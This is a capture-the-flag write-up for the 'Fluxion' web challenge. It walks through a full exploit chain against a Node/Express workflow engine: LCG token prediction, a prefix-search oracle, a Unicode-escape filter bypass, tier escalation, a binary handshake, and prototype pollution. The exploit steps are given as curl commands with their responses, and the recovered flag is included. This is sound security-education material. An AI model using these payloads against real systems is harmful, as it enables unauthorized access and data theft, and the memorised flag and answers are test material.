# Fluxion

Durable workflow engine with a live observability console (web, 500 pts). The
flag is stored on the private `admin-provision-approval` run and only leaks through
a template-render diagnostic once that run is armed and completed. Key idea: a
truncated-LCG recovery, a `$startsWith` prefix oracle, a Unicode-escape regex
bypass, an `Object.assign` tier-merge bug, and the binary FCP arming handshake are
chained to mint an `armToken`, then prototype pollution (`constructor.prototype`)
turns the report renderer into a flag oracle.

## Recon

Given file: `fluxion-source.zip` (later `fluxion-source-new.zip` / v2, which adds
the FCP control plane). Node/Express app behind an in-container nginx; the app
binds `127.0.0.1:8001`, nginx fronts port `3000`.

```bash
$ unzip -l fluxion-source-new.zip | grep -E 'fcp|control|capability|enrollment|server.js|prng'
  fluxion/src/lib/fcp.js
  fluxion/src/lib/capability.js
  fluxion/src/routes/control.js
  fluxion/src/rpc/enrollment.js
  fluxion/src/rpc/provisioning.js
  fluxion/src/server.js
  fluxion/src/prng.js
  ...
```

`src/server.js` exposes one JSON-RPC endpoint (`POST /api/rpc` with
`{"method":..., "params":...}`). The relevant handlers: `fetchRuns`,
`fetchEvents`, `searchRuns`, `previewApprovalGrant`, `resumeHook`,
`saveViewPreferences`, `renderRunReport`, `probeTarget`, and (from
`src/rpc/*.js`) `enrollDevice`, `probeIntegrationEndpoint`,
`testNotificationChannel`.

Two key facts from `world.js`: the privileged run is created with
`workflowName = 'admin-provision-approval'`, its flag is held in `run._flag`, and
its hook token + step IDs come from a per-run truncated LCG (`prng.js`). The
private hook is resumed only through `resumeHook`, which now demands a valid
approval grant **and** a live `armToken` from the FCP control plane.

## Analysis

The chain is a sequence of five named bugs, each confirmed against the source and
live instance:

1. **Truncated LCG state recovery.** `makeRunTokenizer` is a 64-bit LCG
   (`A=6364136223846793005, C=1442695040888963407, M=2^64`). `next()` leaks the
   **top 24 bits** (`state >> 40`) as a 4-char `base64url` stepId; `nextToken()`
   leaks the **full 64-bit** state as the hook token. The admin run's five stepIds
   are public via `fetchEvents`, so we recover the low 40 bits and predict the next
   state (the hook token).
2. **`$startsWith` prefix oracle.** `searchRuns` indexes `approvalNonce` but only
   allows the `$startsWith` operator on it, and filters on the private field while
   returning only public projections. A `count == 1` answer is a boolean prefix
   oracle for the 16-hex-char nonce.
3. **Unicode-escape regex bypass.** `signPreviewGrant` blocks the act names
   `resume/approve/execute/provision` by matching the *raw* string
   `/"act"\s*:\s*"([^"]*)"/`. Passing `"act":"res\u0075me"` (a valid JSON escape)
   makes the raw check see `res\u0075me` while `verifyGrant`'s `JSON.parse` yields
   `act = "resume"`.
4. **`Object.assign` tier merge bug.** `enrollDevice` builds
   `base = {tier:'viewer', scopes:['read'], ...}` and does
   `Object.assign(base, profile)`, so a self-service `profile = {tier:'operator'}`
   produces a signed **operator** enrollment — the tier that FCP's `HELLO` accepts.
5. **Prototype pollution + path resolver.** `saveViewPreferences` uses `mergeDeep`
   that only blocks `__proto__`, not `constructor`. `constructor.prototype`
   reaches `Object.prototype`, setting `reportDefaults.presentation.caption`.
   `renderRunReport` then renders that caption with `resolveScopePath`, which
   supports `Map.get` — so `engine.runs.<runId>._flag` resolves to the flag, and
   the non-numeric value is echoed in the `E_SCALAR` diagnostic.

## Exploit

1. **Find the admin run.** List runs and pick the one whose workflow is
   `admin-provision-approval`.

```bash
$ curl -s http://HOST/api/rpc -H 'content-type: application/json' \
  -d '{"method":"fetchRuns","params":{}}'
# ... {"runId":"run_KNC37YVWQT4JARV9479MNCGA8E","workflowName":"admin-provision-approval","status":"awaiting-approval",...}
```

2. **Recover the private hook token from the step IDs.** `fetchEvents` returns the
   five `stepId`s (each the top 24 bits of a consecutive LCG state); solve the
   truncated LCG to predict the next full state and encode it as `base64url`.

```bash
$ curl -s http://HOST/api/rpc -H 'content-type: application/json' \
  -d '{"method":"fetchEvents","params":{"runId":"run_KNC37YVWQT4JARV9479MNCGA8E"}}'
# stepIds: UOAa, tauU, Wz6Y, la-d, xAEd
```

Truncated-LCG solve (Z3/SMT over the 64-bit affine recurrence) gives
`x_low = 939262322742` and the next state encodes to the hook token:

```text
seGPW13faVE
```

3. **Recover `approvalNonce` with the prefix oracle.** For each of the 16 hex
   positions, test `$startsWith` and keep a digit when `count` becomes `1`.

```bash
$ curl -s http://HOST/api/rpc -H 'content-type: application/json' \
  -d '{"method":"searchRuns","params":{"filter":{"approvalNonce":{"$startsWith":"5d"}}}}'
# {"result":{"results":[...],"count":1}}   # "5d" is a valid prefix
```

Result:

```text
5d80be4fbbfa9c3a
```

4. **Forge a self-signed approval grant** with the Unicode-escape act bypass. The
   document must bind `aud=approvals`, `act=resume`, `runId`, and `nonce`.

```bash
$ curl -s http://HOST/api/rpc -H 'content-type: application/json' \
  -d '{"method":"previewApprovalGrant","params":{"document":"{\"aud\":\"approvals\",\"act\":\"res\\u0075me\",\"runId\":\"run_KNC37YVWQT4JARV9479MNCGA8E\",\"nonce\":\"5d80be4fbbfa9c3a\"}"}}'
# {"result":{"grant":"<base64url>.<hmac>"}}
```

5. **Mint an operator enrollment** through the self-service endpoint.

```bash
$ curl -s http://HOST/api/rpc -H 'content-type: application/json' \
  -d '{"method":"enrollDevice","params":{"profile":{"tier":"operator"}}}'
# {"result":{"ok":true,"deviceId":"dev_...","tier":"operator","enrollment":"<base64url>.<hmac>"}}
```

6. **Read the FCP banner** (uppercase path; nginx's case-sensitive location lets
   `/FCP` through to the app).

```bash
$ curl -s http://HOST/FCP
# {"proto":"FCP/1","transport":"application/octet-stream, one frame per request",
#  "frames":["HELLO(0x01)","KEX(0x02)","TICK(0x04)","ARM(0x03)"],"note":"..."}
```

7. **Run the FCP/1 arming handshake** over `POST /FCP` (raw octet-stream, one
   frame per request). Frame layout (from `lib/fcp.js`): 13-byte header
   `magic(2)=0x46 0x58, version(1)=0x01, type(1), flags(1), seq(1), sid(4),
   length(3, 24-bit BE)`, then payload, then `crc32` (4, IEEE) over header+payload.
   Session key is `HMAC-SHA256(approvalNonce_utf8, serverSalt)[0:16]`.

   - `HELLO` (0x01, seq 0, sid 0): payload = the operator enrollment string.
   - `CHALLENGE` (0x81): payload = `serverSalt(8) || policy(1)`.
   - `KEX` (0x02, seq 1): payload = `HMAC(sessionKey, transcript)[0:8]` where
     `transcript = HELLO_frame || CHALLENGE_frame`.
   - `KEXOK` (0x82): payload = `grantSalt(8)`.
   - `TICK` (0x04) x `ATTEST_STEPS` (=1 in the deployed build): payload =
     `HMAC(sessionKey, "FXTICK" || chain_i || byte(i))[0:8]`.
   - `TOCK` (0x84): payload = `remaining(2 BE) || delayMs(4 BE) || chain_{i+1}(8)`.
   - `ARM` (0x03, FINAL flag): payload = `runId_utf8 || tag(16)`, with
     `tag = HMAC(sessionKey, transcript' || runId_utf8)[0:16]` and
     `transcript' = transcript || KEX_frame || KEXOK_frame`.
   - `ARMED` (0x83): payload = the arm capability token.

   The `ARMED` reply is the `armToken`.

8. **Resume the admin run** with hook token + forged grant + armToken, and
   `payload.approved = true` to complete it.

```bash
$ curl -s http://HOST/api/rpc -H 'content-type: application/json' -d '{
    "method":"resumeHook",
    "params":{"token":"seGPW13faVE","grant":"<grant>","armToken":"<armToken>","payload":{"approved":true}}
  }'
# {"result":{"ok":true,"runId":"run_KNC37YVWQT4JARV9479MNCGA8E","status":"completed"}}
```

9. **Prototype-pollute the report caption.** `mergeDeep` skips only `__proto__`;
   walk through `constructor.prototype` to set `Object.prototype.presentation`.

```bash
$ curl -s http://HOST/api/rpc -H 'content-type: application/json' -d '{
    "method":"saveViewPreferences",
    "params":{"prefs":{"constructor":{"prototype":{"presentation":{
        "caption":"${engine.runs.run_KNC37YVWQT4JARV9479MNCGA8E._flag}",
        "token":"5d80be4fbbfa9c3a"}}}}}
  }'
# {"result":{"ok":true,"prefs":{...}}}
```

10. **Render the report and read the flag from the diagnostic.** The caption
    resolves `engine.runs.<runId>._flag` (a `Map` in `world.js`, which
    `resolveScopePath` handles), the value is not numeric, and the thrown
    `E_SCALAR` message includes the flag.

```bash
$ curl -s http://HOST/api/rpc -H 'content-type: application/json' \
  -d '{"method":"renderRunReport","params":{"runId":"run_KNC37YVWQT4JARV9479MNCGA8E"}}'
# {"result":{"runId":"run_KNC37YVWQT4JARV9479MNCGA8E","report":"render diagnostic",
#  "diagnostic":"E_SCALAR: 'engine.runs.run_KNC37YVWQT4JARV9479MNCGA8E._flag' is not a renderable metric: TFC{5d7096f57f88723bfccc910121b7f9cd}"}}
```

## Full chain

1. `fetchRuns` -> find `admin-provision-approval` runId
2. `fetchEvents` -> 5 stepIds -> truncated-LCG solve -> hook token `seGPW13faVE`
3. `searchRuns` `$startsWith` oracle -> `approvalNonce = 5d80be4fbbfa9c3a`
4. `previewApprovalGrant` with `"act":"res\u0075me"` -> forged approval grant
5. `enrollDevice` with `profile:{tier:'operator'}` -> operator enrollment
6. `GET /FCP` -> protocol banner
7. `POST /FCP` HELLO/KEX/TICK/ARM (sessionKey = HMAC-SHA256(nonce, serverSalt)[0:16]) -> `armToken`
8. `resumeHook(token, grant, armToken, payload:{approved:true})` -> run completed
9. `saveViewPreferences` -> `constructor.prototype.presentation = {caption, token}`
10. `renderRunReport` -> `E_SCALAR` diagnostic leaks the flag

## Flag

`TFC{5d7096f57f88723bfccc910121b7f9cd}`

## Lessons

- A filter that operates on a private field but returns a public projection is a
  boolean oracle (`$startsWith` on `approvalNonce`).
- Regex-based deny lists on a serialized document can be defeated by an escape
  that the later parser decodes (`"act":"res\u0075me"`).
- A "read-only" merge that only blocks `__proto__` is still prototype pollution:
  `constructor.prototype` reaches `Object.prototype`.
- When a privileged action is gated by an opaque binary handshake, read the
  shipped codec source: the frame layout, transcript, and HMAC key derivation are
  all documented in `lib/fcp.js`.
